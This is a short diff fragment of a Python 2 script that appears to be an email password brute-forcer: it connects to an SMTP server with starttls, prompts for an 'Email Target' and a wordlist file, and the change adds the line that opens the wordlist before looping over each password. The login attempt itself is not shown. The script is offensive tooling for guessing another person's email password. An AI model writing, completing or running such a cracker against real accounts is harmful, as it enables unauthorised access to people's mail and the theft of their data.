@@ -14,6 +14,7 @@ smtpserver.starttls()
 email = raw_input("Enter Email Target: ")
 print("++++++++++++++++++++++++++++++++++++++++")
 passwfile = raw_input("Enter WordList File: ")
+passwfile = open(passwfile,"r")
 
 for password in passwfile:
     try:
